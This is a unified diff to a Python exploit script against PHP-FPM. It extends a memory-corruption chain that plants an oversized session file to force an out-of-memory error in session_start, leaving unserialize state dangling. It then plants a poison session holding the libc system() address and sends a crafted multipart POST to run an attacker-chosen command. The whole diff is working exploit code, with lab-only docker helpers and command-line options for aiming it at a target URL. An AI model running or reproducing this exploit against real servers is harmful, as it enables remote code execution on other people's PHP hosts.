@@ -519,12 +519,84 @@ def ce_sid():
 
 class ExploitFPM:
     """Chain-E FPM exploitation. Externally-provided bases required."""
-    def __init__(self, t, cmd, fam, chunk, exe, libc, session_dir=None):
+    def __init__(self, t, cmd, fam, chunk, exe, libc, session_dir=None, memory_limit_mib=64, docker_container=None):
         self.t = t; self.cmd = cmd.encode() if isinstance(cmd, str) else cmd
         self.fam = fam; self.chunk = chunk; self.exe = exe; self.libc = libc
         self.session_dir = session_dir
-    def arm(self, sid):
-        """Request A: trigger session_start OOM in the FPM child."""
+        # arm_bytes sizes the pre-planted session file. session_start reads the
+        # whole file into memory AND allocates another same-size string for the
+        # unserialize result -> 2x the file size against the memory_limit. Pick
+        # ml/2 + 4 MB margin so one allocation fits but the second OOMs.
+        self.arm_bytes = max(64, memory_limit_mib // 2 + 4) * 1024 * 1024
+        # Lab mode: when a container is set, chown planted files to www-data via
+        # `docker exec` after writing. Required when the Python process cannot
+        # write files PHP's session handler can later open with O_RDWR (file
+        # perms crossing UIDs via a bind-mounted volume don't always honour
+        # 0o666 inside the container, so group-match alone can still EACCES).
+        self.docker_container = docker_container
+    def _fixup_perms(self, path):
+        """Lab helper: when running against a docker FPM, chown the planted
+        session file to www-data inside the container so PHP's session handler
+        can open it with O_RDWR."""
+        if not self.docker_container: return
+        import subprocess
+        try:
+            subprocess.run(
+                ["docker", "exec", self.docker_container, "chown", "www-data:www-data",
+                 f"/var/lib/php/sessions/{os.path.basename(path)}"],
+                check=False, capture_output=True, timeout=5)
+        except Exception: pass
+    def _arm_payload(self):
+        """``a|s:<N>:"AAA...";``: one declared-length string. Reading the file
+        allocates N bytes; unserialize's string parse allocates another N -> OOM."""
+        n = self.arm_bytes
+        return b'a|s:%d:"' % n + b"A" * n + b'";'
+    def _write_arm_session(self, sid):
+        """Pre-plant huge session file at arm_sid. Content is one declared-length
+        string whose decode doubles the footprint. The arm request's session_start
+        then OOMs mid-decode, leaving BG(unserialize).data dangling.
+
+        chmod 0666 because PHP's session files handler opens O_RDWR; a 0644
+        file owned by someone other than the PHP user triggers EACCES and the
+        session fails to read (so no OOM, so no arm)."""
+        if not self.session_dir: raise RuntimeError("no --fpm-session-dir; cannot plant arm blob")
+        p = os.path.join(self.session_dir, f"sess_{sid}")
+        with open(p, "wb") as f:
+            n = self.arm_bytes
+            f.write(b'a|s:%d:"' % n)
+            # Stream the 'A' body in 1 MB blocks to keep memory usage bounded here
+            block = b"A" * (1024 * 1024)
+            remaining = n
+            while remaining > 0:
+                take = min(len(block), remaining)
+                f.write(block if take == len(block) else block[:take])
+                remaining -= take
+            f.write(b'";')
+        try: os.chmod(p, 0o666)
+        except OSError: pass
+        self._fixup_perms(p)
+        return p
+    def arm(self, sid, arm_path=None):
+        """Request A: trigger session_start OOM in the FPM child.
+
+        Preferred ("get" shape): bodiless GET to a path whose application
+        code calls `session_start()`. The OOM is rendered in-band, the child
+        survives, and the heap state is the one the dispatch geometry was
+        measured on. Pass `arm_path` pointing to such an endpoint.
+
+        Fallback ("post" shape): multipart POST with PHP_SESSION_UPLOAD_PROGRESS;
+        the rfc1867 callback starts the session pre-RINIT. Decode OOMs the
+        same file but under a *different* heap state (multipart scratch alive)
+        AND the fatal happens during Request Startup, which FPM typically
+        treats as a worker crash -> worker killed -> fresh ASLR. Only works
+        when the application doesn't itself call session_start()."""
+        if arm_path:
+            hdr = (f"GET {arm_path} HTTP/1.1\r\nHost: {self.t.host_header}\r\n"
+                   f"Cookie: PHPSESSID={sid}\r\nConnection: close\r\n\r\n").encode()
+            self.t.reset(); s = self.t._conn(); s.settimeout(self.t.timeout)
+            s.sendall(hdr)
+            try: return self.t._read_one(s)
+            except Exception: return b""
         parts = [{"name": "PHPSESSID", "data": sid.encode()},
                  {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"arm"},
                  {"name": "f", "filename": "a.txt", "data": b"A" * 65536}]
@@ -540,12 +612,15 @@ class ExploitFPM:
             except Exception: pass
             self.t.reset()
     def _write_session(self, sid, sys_addr):
-        """Local-FS write of the serialized session (operator must have fs access)."""
+        """Local-FS write of the serialized session (operator must have fs access).
+
+        chmod 0666 because PHP's session files handler opens O_RDWR."""
         if not self.session_dir: raise RuntimeError("no --fpm-session-dir; cannot plant session blob")
         p = os.path.join(self.session_dir, f"sess_{sid}")
         with open(p, "wb") as f: f.write(ce_session_blob(sys_addr))
-        try: os.chmod(p, 0o644)
+        try: os.chmod(p, 0o666)
         except OSError: pass
+        self._fixup_perms(p)
         return p
     def consume(self, sid):
         """Dispatch: byte-exact multipart POST that reclaims the stale struct.
@@ -572,20 +647,39 @@ class ExploitFPM:
         s.sendall(head); s.sendall(body)
         try: return self.t._read_one(s), meta
         except Exception: return b"", meta
-    def run(self, workers=1, attempts=0):
-        """Full chain: arm → (equalise 2*workers) → N dispatches round-robin.
-        attempts defaults to max(2, workers+1)."""
+    def run(self, workers=1, attempts=0, arm_path=None):
+        """Full chain: pre-plant huge-arm-session → arm (OOM, child survives) →
+        equalise → plant poison-session → consume (reclaim + fire).
+
+        TWO SIDs are used:
+          arm_sid     carries the huge-string session file (triggers OOM)
+          consume_sid carries `a|i:<sys_addr>;` (feeds the write primitive)
+
+        `arm_path` names an endpoint whose application code calls
+        `session_start()` — required for the in-band fatal shape that leaves
+        the child alive. Without it the fallback (upload_progress) is used,
+        which typically kills the FPM worker and voids the chain."""
         if attempts == 0: attempts = max(2, workers + 1)
         _, meta = ce_poison_value(self.fam, self.chunk, self.exe, self.libc)
-        sid = ce_sid()
-        if self.session_dir: self._write_session(sid, int(meta["system"], 16))
-        self.arm(sid)
+        arm_sid = ce_sid()
+        consume_sid = ce_sid()
+        if not self.session_dir:
+            return {"receipt": False, "error": "no --fpm-session-dir; cannot plant arm/consume blobs", "meta": meta}
+        # Plant the huge arm file (session_start on this SID OOMs)
+        self._write_arm_session(arm_sid)
+        # Fire arm: OOM leaves BG(unserialize).data dangling
+        arm_resp = self.arm(arm_sid, arm_path=arm_path)
+        armed = b"Allowed memory size" in (arm_resp or b"")
         if workers > 1: self.equalise(2 * workers)
+        # Plant the poison blob at consume_sid for consume's session_start to parse
+        self._write_session(consume_sid, int(meta["system"], 16))
         for i in range(attempts):
-            resp, _ = self.consume(sid)
+            resp, _ = self.consume(consume_sid)
             if resp and self.cmd[:16] in resp:
-                return {"receipt": True, "attempt": i + 1, "preview": resp[:200], "meta": meta}
-        return {"receipt": False, "attempts": attempts, "meta": meta}
+                return {"receipt": True, "attempt": i + 1, "preview": resp[:200], "meta": meta,
+                        "arm_sid": arm_sid, "consume_sid": consume_sid, "armed": armed}
+        return {"receipt": False, "attempts": attempts, "meta": meta,
+                "arm_sid": arm_sid, "consume_sid": consume_sid, "armed": armed}
 
 # --------------------------------------------------------------------- spray driver
 def _mkexp(url, cmd, zif, dtor, htdata, huge, arm_mode="bigfield"):
@@ -700,6 +794,9 @@ def main():
     ap.add_argument("--fpm-session-dir", default="", help="local path to session storage dir (writes sess_<SID>)")
     ap.add_argument("--fpm-workers", type=int, default=1, help="pool width (controls equalise count)")
     ap.add_argument("--fpm-attempts", type=int, default=0, help="dispatch attempts (0 = max(2, workers+1))")
+    ap.add_argument("--fpm-ml", type=int, default=64, help="target's PHP memory_limit in MiB (sizes the arm session file; default 64)")
+    ap.add_argument("--fpm-docker", default="", help="LAB-ONLY: docker container name; chowns planted session files to www-data via `docker exec` so the FPM worker can open them (bypass bind-mount cross-UID access quirks)")
+    ap.add_argument("--fpm-arm-path", default="", help="URL path to the application endpoint that calls session_start() (required for in-band OOM; without this the fallback upload_progress arm kills the worker)")
     a = ap.parse_args()
 
     if a.stage2:
@@ -757,8 +854,11 @@ def main():
             print(f"[*] bases from flags: chunk={chunk:#x} exe={exe:#x} libc={libc:#x}")
         if not a.fpm_session_dir:
             print(f"[!] no --fpm-session-dir; the dispatch assumes the a|i:<system>; blob is already"); print(f"    written to {{session_dir}}/sess_<SID> by some other means. Expect no receipt otherwise.")
-        ex = ExploitFPM(KA(a.url), a.cmd, fam, chunk, exe, libc, session_dir=a.fpm_session_dir or None)
-        result = ex.run(workers=a.fpm_workers, attempts=a.fpm_attempts)
+        ex = ExploitFPM(KA(a.url), a.cmd, fam, chunk, exe, libc,
+                        session_dir=a.fpm_session_dir or None,
+                        memory_limit_mib=a.fpm_ml,
+                        docker_container=a.fpm_docker or None)
+        result = ex.run(workers=a.fpm_workers, attempts=a.fpm_attempts, arm_path=a.fpm_arm_path or None)
         meta = result["meta"]
         print(f"[*] value val={meta['val']:#x} target={meta['target']} system={meta['system']} "
               f"used_slots={meta['used_slots']}")
